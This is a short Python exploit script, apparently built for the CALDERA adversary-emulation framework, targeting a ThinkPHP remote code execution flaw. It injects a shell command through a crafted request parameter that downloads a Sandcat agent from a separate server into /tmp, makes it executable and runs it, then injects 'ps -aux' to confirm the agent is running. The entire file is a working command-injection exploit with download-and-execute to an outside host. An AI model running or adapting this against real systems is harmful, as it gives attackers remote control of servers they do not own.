import argparse
import requests
import urllib.parse

parser = argparse.ArgumentParser('thinkphp rce')
parser.add_argument('-i', '--ip', required=True, default='127.0.0.1', help='Send me an IP to exploit ThinkPHP')
parser.add_argument('-s', '--server', required=True, default='127.0.0.1', help='Send me the IP of the CALDERA server')
args = parser.parse_args()


sandcat = "curl -sk -X POST -H 'file:sandcat.go' -H 'platform:arm' "+args.server+"/file/download > " \
          "/tmp/sandcat-arm && chmod +x /tmp/sandcat-arm && /tmp/sandcat-arm -server " \
            +args.server+" -group my_group &"

payload = urllib.parse.quote(sandcat, safe='')

exploit = r"http://"+args.ip+r"/public/index.php?s=index/\think\request/cache&key="+payload+"|system"

try:
    requests.get(exploit, timeout=2)
except requests.exceptions.Timeout:
    pass

payload = urllib.parse.quote("ps -aux", safe='')
check = r"http://"+args.ip+r"/public/index.php?s=index/\think\request/cache&key="+payload+"|system"
r = requests.get(check)
if 'sandcat' in r.text:
    print(f"{args.ip}:thinkPHP_exploit")
    exit(0)
else:
    print(f"{args.ip}:thinkPHP_exploit")
    exit(1)